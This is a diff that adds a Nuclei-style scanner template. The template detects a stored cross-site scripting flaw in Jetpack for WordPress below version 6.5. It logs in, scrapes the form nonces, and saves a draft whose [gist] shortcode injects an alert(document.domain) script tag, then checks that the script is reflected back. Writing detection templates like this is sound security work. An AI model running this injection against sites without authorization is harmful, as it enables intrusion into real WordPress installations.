@@ -1,0 +1,108 @@
+flow: http(1) && http(2) && http(3) && http(4)
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - status_code == 302
+    - contains(header, 'wordpress_logged_in')
+    internal: true
+    type: dsl
+  raw:
+  - 'POST /wp-login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    '
+- extractors:
+  - group: 1
+    internal: true
+    name: nonce
+    part: body
+    regex:
+    - name="_wpnonce"[^>]+value="([^"]+)"
+    type: regex
+  - group: 1
+    internal: true
+    name: user_id
+    part: body
+    regex:
+    - id="user-id"[^>]+value="([^"]+)"
+    type: regex
+  - group: 1
+    internal: true
+    name: post_id
+    part: body
+    regex:
+    - id=.post_ID.[^>]+value=.([0-9]+)
+    type: regex
+  - group: 1
+    internal: true
+    name: referer
+    part: body
+    regex:
+    - name="_wp_http_referer"[^>]+value="([^"]+)"
+    type: regex
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(body, 'Add New Post')
+    internal: true
+    type: dsl
+  raw:
+  - 'GET /wp-admin/post-new.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - dsl:
+    - status_code == 302
+    internal: true
+    type: dsl
+  raw:
+  - 'POST /wp-admin/post.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    _wpnonce={{nonce}}&_wp_http_referer={{referer}}&user_ID={{user_id}}&action=editpost&originalaction=editpost&post_author={{user_id}}&post_type=post&original_post_status=auto-draft&referredby=&_wp_original_http_referer=&auto_draft=1&post_ID={{post_id}}&post_title=XSS+Test&content=[gist]"></script><script>alert(document.domain)</script><script
+    src="[/gist]&post_status=draft&hidden_post_status=draft&visibility=public&hidden_post_visibility=public&mm=12&jj=26&aa=2025&hh=04&mn=18&ss=00&hidden_mm=12&hidden_jj=26&hidden_aa=2025&hidden_hh=04&hidden_mn=18&save=Save+Draft
+
+    '
+- matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(body, 'alert(document.domain)')
+    type: dsl
+  raw:
+  - 'GET /wp-admin/post.php?post={{post_id}}&action=edit HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: jetpack-stored-xss
+info:
+  author: 0x_Akoko
+  description: 'Detected authenticated stored XSS in Jetpack < 6.5 via crafted Gist
+    shortcode.
+
+    '
+  metadata:
+    max-request: 4
+    runzero-review: REJECT/2026-01-05/excluding tag authenticated
+    verified: true
+  name: Jetpack < 6.5 - Stored Cross-Site Scripting
+  reference:
+  - https://wpscan.com/vulnerability/5e63453f-4d95-4bc3-9338-2d77f95f9ee7/
+  - https://wordpress.org/plugins/jetpack/
+  severity: medium
+  tags: wordpress,wp-plugin,wpscan,jetpack,xss,authenticated,intrusive
